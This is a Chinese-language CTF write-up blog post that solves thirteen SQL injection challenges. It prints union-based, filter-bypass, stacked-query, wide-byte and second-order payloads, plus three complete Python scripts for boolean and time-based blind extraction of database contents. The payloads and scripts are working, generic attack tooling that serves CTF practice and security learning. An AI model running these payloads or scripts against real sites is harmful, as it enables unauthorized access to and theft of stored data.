---

title: 青岑CTF-SQL注入WP
date: 2026-07-21
categories: ["CTF-Writeups","青岑CTF-WP集"]
permalink: /ctf-writeups-ctf-wp/ctf-sqlwp
---


# 1.EZSQL
简单的万能密码：
```
/?username=admin' or 1=1 %23&password=123
```
# 2.EZSQL1
先查看闭合方式：
```
/?username=admin' or 1=1 %23&password=123 //回显Welcome admin
```
基本上确定是单引号闭合了，然后看数据库长度
```
/?username=admin' order by 5 %23&password=123 //报错，所以数据库长度为4
```
下面就查看哪个位置有回显
```
/?username=-admin' union select 1,2,3,4 %23&password=123 //回显Welcome 2
```
所以2这个地方是能回显东西的
```
/?username=-admin' union select 1,database(),3,4 %23&password=123 //回显Welcome user
```
库的名字是user,然后查看表名
```
/?username=-admin' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='user' %23&password=123 //回显Welcome flag
```
表名是flag，接下来看列名
```
/?username=-admin' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='user' and table_name='flag' %23&password=123 //回显Welcome id,name,passwd,secret
``` 
最后直接查看这四个参数
```
/?username=-admin' union select 1,group_concat(id,name,passwd,secret),3,4 from flag %23&password=123 //回显1 admin admin123 flag
```
#  3.EZSQL2
先查看闭合方式：
```
/?username=admin' or 1=1 %23&password=123 //回显Welcome admin
```
回显Illegal SQL injection翻译过来就是非法的SQL注入，经过测试是空格被过滤了，可以使用%09来绕过
```
/?username=admin'%09or%091=1%09%23&password=123 //回显Welcome admin
```
接下类的操作就和上一题类似了
```
/?username=-admin'%09union%09select%091,group_concat(id,name,passwd,secret),3,4%09from%09flag%09%23&password=123
```
#  4.EZSQL3
先试一下
```
/?username=admin' or 1=1 %23&password=123 //回显非法sql
```
再试一下
```
/?username=admin'%09or%091=1%09%23&password=123 //回显SQL Error: SELECT * FROM flag WHERE name = 'admin' 1=1 #' AND passwd = '123'
```
最后使用了
```
/?username=admin'%09%09%23&password=123 //回显Welcome admin
```
接下来应该就和上一题类似了
```
/?username=-admin'%09union%09select%091,group_concat(id,name,passwd,secret),3,4%09from%09flag%09%23&password=123 //结果报错SQL Error: SELECT * FROM flag WHERE name = '-admin' 1,group_concat(id,name,passwd,secret),3,4 #' AND passwd = '123' 
```
分析：既然报错了，按理说应该是
```
SQL Error: SELECT * FROM flag WHERE name = '-admin'%09union%09select%091,group_concat(id,name,passwd,secret),3,4%09from%09flag%09%23&password=123'
```
可是这里的union、select、from、flag不见了？？？被过滤了呗，双写绕过
```
/?username=-admin'%09ununionion%09seselectlect%091,group_concat(id,name,passwd,secret),3,4%09frfromom%09flaflagg%09%23&password=123
```
# 5.EZSQL4
联合查询，和2差不多
# 6.EZSQL5
不是很懂，先试了联合查询，发现union select 好像被过滤了，大小写，双写都绕不过去。然后试了一下堆叠注入，即使用分号（；）来执行多个语句，
```
/?id=1';show tables;%23
```
发现了flag表，然后就执行下面的语句
```
/?id=1';handler flag open;handler flag read first;-- //意思是打开flag表，读第一条数据
``` 
总之还得是**康神！！！！！！**
# 7.EZSQL6
布尔盲注：
```bash
"""  
版权归属者：张锦洲  
"""  
import requests  
import time  
  
url = "http://docker.qingcen.net:44447/"  
  
def blind_sqli(payload_template, max_length=200):  
    """通用盲注函数"""  
    result = ""  
    for i in range(1, max_length + 1):  
        low = 32  
        high = 127  
  
        while low < high:  
            mid = (low + high) // 2  
            payload = payload_template.format(i=i, mid=mid)  
            params = {"username": payload, "password": "1"}  
  
            try:  
                res = requests.get(url, params=params, timeout=5)  
                if "Login successful." in res.text:  
                    low = mid + 1  
                else:  
                    high = mid  
            except Exception as e:  
                time.sleep(1)  
                continue  
  
        if low <= 32:  
            break  
  
        result += chr(low)  
        print(chr(low), end="", flush=True)  
  
    print()  # 换行  
    return result  
  
def get_database():  
    print("[*] 正在爆破数据库名...")  
    payload = "' OR ascii(substr((SELECT database()),{i},1))>{mid}#"  
    return blind_sqli(payload)  
  
def get_tables():  
    print("[*] 正在爆破表名...")  
    payload = "' OR ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1))>{mid}#"  
    return blind_sqli(payload, max_length=500)  
  
def get_columns(table_name):  
    print(f"[*] 正在爆破 {table_name} 表的列名...")  
    payload = f"' OR ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table_name}'),{{i}},1))>{{mid}}#"  
    return blind_sqli(payload, max_length=500)  
  
def get_data(table_name, columns):  
    print(f"[*] 正在爆破 {table_name} 表的数据 ({columns})...")  
    payload = f"' OR ascii(substr((SELECT group_concat({columns}) FROM {table_name}),{{i}},1))>{{mid}}#"  
    return blind_sqli(payload, max_length=1000)  
  
def main():  
    print("=" * 50)  
    print("全自动 SQL 盲注拿 Flag 脚本")  
    print("=" * 50)  
  
    # Step 1: 爆库名  
    db_name = get_database()  
    print(f"[+] 数据库名: {db_name}")  
  
    # Step 2: 爆表名  
    tables = get_tables()  
    print(f"[+] 表名: {tables}")  
  
    # 自动解析表名（用逗号分隔）  
    table_list = [t.strip() for t in tables.split(",") if t.strip()]  
    print(f"[+] 发现表: {table_list}")  
  
    # Step 3: 对每个表爆列名，找到包含 flag 的表  
    target_table = None  
    target_columns = None  
  
    for table in table_list:  
        columns = get_columns(table)  
        print(f"[+] {table} 表的列名: {columns}")  
  
        # 如果列名包含 flag 相关字段，记录下来  
        if columns:  
            column_list = [c.strip() for c in columns.split(",") if c.strip()]  
            if target_table is None:  # 默认取第一个表  
                target_table = table  
                target_columns = ",".join(column_list)  
  
            # 优先选择包含 flag/secret 的表  
            lower_cols = columns.lower()  
            if "flag" in lower_cols or "secret" in lower_cols:  
                target_table = table  
                target_columns = ",".join(column_list)  
                print(f"[+] 找到目标表: {table}")  
                break  
  
    # Step 4: 爆数据  
    if target_table and target_columns:  
        print(f"\n[*] 开始爆破 {target_table} 表的数据...")  
        data = get_data(target_table, target_columns)  
        print(f"\n[+] 数据: {data}")  
        print(f"\n[+] Flag 可能为: {data}")  
    else:  
        print("[-] 未找到目标表，请手动检查")  
  
    print("=" * 50)  
    print("爆破完成！")  
    print("=" * 50)  
  
if __name__ == "__main__":  
    main()
```

# 8.EZSQL8
```bash
import requests  
import time  
import sys  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
  
class FastTimeBlindSQLI:  
    def __init__(self, url, delay_time=1, timeout=5, threads=5):  
        self.url = url  
        self.delay_time = delay_time  
        self.timeout = timeout  
        self.threads = threads  
        self.session = requests.Session()  
  
    def inject(self, payload):  
        """执行注入并返回是否触发延迟"""  
        params = {"id": payload}  
  
        try:  
            start_time = time.time()  
            self.session.get(self.url, params=params, timeout=self.timeout)  
            elapsed_time = time.time() - start_time  
            return elapsed_time >= self.delay_time - 0.3  
        except:  
            return False  
  
    def extract_char_binary(self, payload_template, position):  
        """二分法提取单个字符（优化版）"""  
        low, high = 32, 126  
  
        while low < high:  
            mid = (low + high) // 2  
            # 使用 > 判断，减少请求次数  
            payload = payload_template.format(pos=position, val=mid)  
  
            if self.inject(payload):  
                low = mid + 1  
            else:  
                high = mid  
  
        return chr(low) if low <= 126 else None  
  
    def extract_data_parallel(self, payload_template, max_length=500, batch_size=10):  
        """并行批量提取数据（超快）"""  
        result = [''] * max_length  
        position = 1  
  
        while position <= max_length:  
            # 批量测试当前位置是否有数据  
            test_payload = payload_template.format(pos=position, val=0)  
            if not self.inject(test_payload):  
                break  
  
            # 并行提取多个字符  
            chars = []  
            with ThreadPoolExecutor(max_workers=self.threads) as executor:  
                futures = {}  
                for offset in range(batch_size):  
                    pos = position + offset  
                    if pos > max_length:  
                        break  
  
                    def extract(p):  
                        low, high = 32, 126  
                        while low < high:  
                            mid = (low + high) // 2  
                            payload = payload_template.format(pos=p, val=mid)  
                            if self.inject(payload):  
                                low = mid + 1  
                            else:  
                                high = mid  
                        return (p, chr(low) if low <= 126 else None)  
  
                    futures[executor.submit(extract, pos)] = pos  
  
                for future in as_completed(futures):  
                    pos, char = future.result()  
                    if char:  
                        result[pos - 1] = char  
                        chars.append(char)  
  
            # 显示进度  
            current = ''.join(result[:position + batch_size]).strip('\x00')  
            print(f"\r[+] 已提取: {current[:50]}{'...' if len(current) > 50 else ''}", end='', flush=True)  
  
            if not chars:  
                break  
  
            position += batch_size  
  
        return ''.join([c for c in result if c])  
  
    def extract_data_fast(self, payload_template, max_length=500):  
        """快速二分提取（单线程但优化）"""  
        result = ""  
  
        for pos in range(1, max_length + 1):  
            # 快速判断是否还有数据  
            test_payload = payload_template.format(pos=pos, val=0)  
            if not self.inject(test_payload) and pos > 10:  
                break  
  
            # 二分查找  
            low, high = 32, 126  
            while low < high:  
                mid = (low + high) // 2  
                payload = payload_template.format(pos=pos, val=mid)  
  
                if self.inject(payload):  
                    low = mid + 1  
                else:  
                    high = mid  
  
            if low <= 126:  
                char = chr(low)  
                result += char  
                print(f"\r[+] {result}", end='', flush=True)  
            else:  
                break  
  
        print()  
        return result  
  
    def get_version(self):  
        """获取版本"""  
        print("[*] 获取版本...")  
        payload = "1' AND IF(ascii(substr(version(),{pos},1))>{val}, sleep({delay}), 0)#"  
        return self.extract_data_fast(payload.replace("{delay}", str(self.delay_time)), 30)  
  
    def get_current_database(self):  
        """获取当前数据库"""  
        print("[*] 获取数据库名...")  
        payload = "1' AND IF(ascii(substr(database(),{pos},1))>{val}, sleep({delay}), 0)#"  
        return self.extract_data_fast(payload.replace("{delay}", str(self.delay_time)), 30)  
  
    def get_all_databases(self):  
        """获取所有数据库"""  
        print("[*] 获取所有数据库...")  
        payload = "1' AND IF(ascii(substr((SELECT group_concat(schema_name) FROM information_schema.schemata),{pos},1))>{val}, sleep({delay}), 0)#"  
        return self.extract_data_fast(payload.replace("{delay}", str(self.delay_time)), 200)  
  
    def get_tables(self, database=None):  
        """获取表名"""  
        if database:  
            payload = f"1' AND IF(ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{database}'),{{pos}},1))>{{val}}, sleep({{delay}}), 0)#"  
        else:  
            payload = "1' AND IF(ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),{pos},1))>{val}, sleep({delay}), 0)#"  
        return self.extract_data_fast(payload.replace("{delay}", str(self.delay_time)), 500)  
  
    def get_columns(self, table_name, database=None):  
        """获取列名"""  
        if database:  
            payload = f"1' AND IF(ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table_name}'),{{pos}},1))>{{val}}, sleep({{delay}}), 0)#"  
        else:  
            payload = f"1' AND IF(ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table_name}'),{{pos}},1))>{{val}}, sleep({{delay}}), 0)#"  
        return self.extract_data_fast(payload.replace("{delay}", str(self.delay_time)), 500)  
  
    def get_data(self, table, column, where="1=1", limit=10):  
        """获取数据"""  
        payload = f"1' AND IF(ascii(substr((SELECT group_concat({column}) FROM {table} WHERE {where} LIMIT {limit}),{{pos}},1))>{{val}}, sleep({{delay}}), 0)#"  
        return self.extract_data_fast(payload.replace("{delay}", str(self.delay_time)), 1000)  
  
  
def ultra_fast_attack(target_url):  
    """超快速攻击"""  
    print("=" * 70)  
    print("超快速 SQL 时间盲注攻击脚本 (优化版)")  
    print(f"目标: {target_url}")  
    print("=" * 70)  
  
    # 使用更激进的参数  
    sqli = FastTimeBlindSQLI(target_url, delay_time=1, timeout=3, threads=10)  
  
    # 快速获取关键信息  
    print("\n[阶段 1] 快速信息收集")  
    print("-" * 50)  
  
    # 并行获取基本信息和当前数据库  
    with ThreadPoolExecutor(max_workers=2) as executor:  
        version_future = executor.submit(sqli.get_version)  
        db_future = executor.submit(sqli.get_current_database)  
  
        version = version_future.result()  
        current_db = db_future.result()  
  
    print(f"\n[+] 版本: {version}")  
    print(f"[+] 数据库: {current_db}")  
  
    # 获取所有表  
    print("\n[阶段 2] 枚举表")  
    print("-" * 50)  
    tables_str = sqli.get_tables()  
    tables = [t.strip() for t in tables_str.split(",") if t.strip()]  
    print(f"[+] 发现 {len(tables)} 个表: {tables}")  
  
    # 快速查找 flag    print("\n[阶段 3] 快速查找 Flag")  
    print("-" * 50)  
  
    flag = None  
  
    # 优先级列表  
    priority = [  
        ('flag', 'flag'),  
        ('flags', 'flag'),  
        ('ctf', 'flag'),  
        ('flag', 'value'),  
        ('secret', 'value'),  
        ('admin', 'flag'),  
        ('users', 'flag'),  
    ]  
  
    # 先尝试常见组合  
    for table, col in priority:  
        if table in tables:  
            print(f"[*] 尝试 {table}.{col}...", end=' ', flush=True)  
            data = sqli.get_data(table, col, limit=5)  
            if data and len(data) > 3:  
                print(f"找到数据!")  
                if '{' in data or 'flag' in data.lower():  
                    flag = data  
                    break  
                else:  
                    print(f"数据: {data[:50]}")  
            else:  
                print("无数据")  
  
    # 如果没有找到，爆破所有表  
    if not flag:  
        print("\n[*] 深度搜索所有表...")  
        for table in tables:  
            if table in [p[0] for p in priority]:  
                continue  
  
            cols_str = sqli.get_columns(table)  
            cols = [c.strip() for c in cols_str.split(",") if c.strip()]  
  
            # 优先找可疑列  
            for col in cols:  
                if any(k in col.lower() for k in ['flag', 'secret', 'pass', 'key']):  
                    print(f"[*] 尝试 {table}.{col}...", end=' ', flush=True)  
                    data = sqli.get_data(table, col, limit=5)  
                    if data:  
                        print(f"找到数据: {data[:50]}")  
                        if '{' in data or 'flag' in data.lower():  
                            flag = data  
                            break  
                    else:  
                        print("无数据")  
  
            if flag:  
                break  
  
    # 输出结果  
    print("\n" + "=" * 70)  
    if flag:  
        print(f"[SUCCESS] Flag: {flag}")  
        with open("flag.txt", "w") as f:  
            f.write(flag)  
        print("[*] 已保存到 flag.txt")  
    else:  
        print("[FAIL] 未找到 Flag")  
        print("\n建议手动检查第一个表:")  
        if tables:  
            print(f"表名: {tables[0]}")  
            cols = sqli.get_columns(tables[0])  
            print(f"列名: {cols}")  
  
    return flag  
  
  
def quick_guess(target_url):  
    """快速盲猜 - 直接猜 flag 内容"""  
    print("\n[快速模式] 直接盲猜 Flag")  
    print("-" * 50)  
  
    sqli = FastTimeBlindSQLI(target_url, delay_time=1, timeout=3)  
  
    # 常见 flag 格式  
    flag_format = "flag{"  
  
    # 直接猜 flag 是否存在常见表中  
    queries = [  
        "SELECT flag FROM flag",  
        "SELECT value FROM flag",  
        "SELECT flag FROM ctf",  
        "SELECT * FROM flag",  
    ]  
  
    for query in queries:  
        print(f"[*] 尝试: {query}...")  
        payload = f"1' AND IF(ascii(substr(({query}),1,1))>0, sleep({sqli.delay_time}), 0)#"  
        if sqli.inject(payload):  
            print(f"[+] 找到数据!")  
            # 提取完整 flag            ext_payload = f"1' AND IF(ascii(substr(({query}),{{pos}},1))>{{val}}, sleep({sqli.delay_time}), 0)#"  
            result = sqli.extract_data_fast(ext_payload, 100)  
            if result:  
                return result  
  
    return None  
  
  
if __name__ == "__main__":  
    target = "http://docker.qingcen.net:44477/"  
  
    if len(sys.argv) > 1:  
        target = sys.argv[1]  
  
    start_time = time.time()  
  
    # 快速攻击  
    flag = ultra_fast_attack(target)  
  
    # 如果没找到，尝试快速盲猜  
    if not flag:  
        flag = quick_guess(target)  
  
    elapsed = time.time() - start_time  
    print(f"\n[*] 总耗时: {elapsed:.2f} 秒")
```

# 9.EZSQL9
宽字节注入（用SQLmap测的），说白了，有了第一题第二题的经验，直接复制过来就行了。
```
/?username=1%df' union select 1,group_concat(id,name,passwd,secret),3,4 from flag %23&password=123
```
# 10.EZSQL10
这个数据库不是MYSQL，而是SQLite，所以#在该数据库用不了，改成-- ，group_concat()函数也不能支持查看多个参数，需要使用||来连接，例如:
```
-- 错误 ❌
group_concat(id, name, age)

-- 正确 ✅  
group_concat(id || '-' || name || '-' || age)
-- 或
group_concat(id || ',' || name || ',' || age)
```
其他步骤和联合查询类似，不再赘叙。
# 11.EZSQL11
SQLite的布尔盲注，呜呜呜，依旧脚本
```bash
import requests  
import time  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
url = "http://docker.qingcen.net:44535/"  
session = requests.Session()  
session.headers.update({  
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"  
})  
  
  
def check_char(payload):  
    """发送单个请求，返回是否匹配"""  
    try:  
        res = session.get(url, params={"id": payload}, timeout=5)  
        return "查询成功" in res.text  
    except Exception as e:  
        return False  
  
  
def binary_search(query_template, index, low=32, high=127):  
    """二分查找单个字符"""  
    while low < high:  
        mid = (low + high) // 2  
        payload = query_template.format(pos=index, mid=mid)  
        if check_char(payload):  
            low = mid + 1  
        else:  
            high = mid  
    return low if low > 32 else None  
  
  
def extract_string(query_template, max_len=200, desc=""):  
    """提取完整字符串"""  
    result = ""  
    print(f"\n[+] 开始提取: {desc}")  
  
    for i in range(1, max_len + 1):  
        char_code = binary_search(query_template, i)  
        if char_code is None:  
            break  
        result += chr(char_code)  
        print(chr(char_code), end="", flush=True)  
  
    print(f" | 长度: {len(result)}")  
    return result  
  
  
# ============ 全自动流程 ============  
# 步骤1: 爆表名  
table_query = "' OR unicode(substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'),{pos},1))>{mid}--"  
tables = extract_string(table_query, desc="表名")  
print(f"[+] 发现表: {tables}")  
  
# 解析表名（支持多个表）  
table_list = tables.split(",")  
target_table = None  
  
for t in table_list:  
    if "flag" in t.lower():  
        target_table = t  
        break  
  
if not target_table and table_list:  
    target_table = table_list[0]  
  
print(f"[+] 目标表: {target_table}")  
  
# 步骤2: 爆建表语句（DDL），获取列名  
ddl_query = f"' OR unicode(substr((SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='{target_table}'),{{pos}},1))>{{mid}}--"  
ddl = extract_string(ddl_query, max_len=500, desc=f"{target_table} 建表语句")  
print(f"[+] DDL: {ddl}")  
  
# 从DDL中提取列名（简单解析）  
import re  
  
columns = re.findall(r'\((.*?)\)', ddl.replace('\n', ' '))  
if columns:  
    # 提取第一个括号内的列定义  
    col_defs = columns[0].split(',')  
    col_names = [c.strip().split()[0].strip('"\'`') for c in col_defs]  
    print(f"[+] 列名: {col_names}")  
else:  
    # 如果解析失败，默认尝试常见列名  
    col_names = ["flag", "value", "data", "password"]  
    print(f"[!] DDL解析失败，尝试常见列名: {col_names}")  
  
# 步骤3: 爆数据  
for col in col_names:  
    data_query = f"' OR unicode(substr((SELECT group_concat({col}) FROM {target_table}),{{pos}},1))>{{mid}}--"  
    data = extract_string(data_query, max_len=1000, desc=f"{target_table}.{col}")  
    if data:  
        print(f"\n[+] 成功获取数据 [{col}]: {data}")  
        if "flag" in data.lower() or "{" in data:  
            print(f"\n{'=' * 50}")  
            print(f"[FLAG] {data}")  
            print(f"{'=' * 50}")  
            break
```
wuwu，只会ai生成脚本，haoFW啊！！！！
# 12.EZSQL12
给了一个可注册账号的界面，在sql注入中出现，八成就是二次注入了。
大致步骤就是

| 步骤       | 动作                  | 例子                          |
| -------- | ------------------- | --------------------------- |
| **① 写入** | 在注册/发帖等位置输入 payload | `username = "admin'--"`     |
| **② 存储** | 程序转义后安全入库           | 库中存的是 `admin'--`            |
| **③ 读取** | 后续功能从库里取出这条数据       | 修改密码时读取 username            |
| **④ 触发** | 取出的数据直接拼进新 SQL      | `WHERE username='admin'--'` |
先注册一个账号为：1' or 1=1 # 的号，密码随心。不过没想到的是，登录进去就能看见flag了，并非真正意义上的二次注入。
# 13.EZSQL13
这个是真正意义上的二次注入，大概意思就是用联合注入（这里我用的是联合注入的payload）来注册账号，然后登录去查看里面的回显，最终的payload是
```
1' union select group_concat(flag) from  flags //点开我的笔记就能看见flag了
```
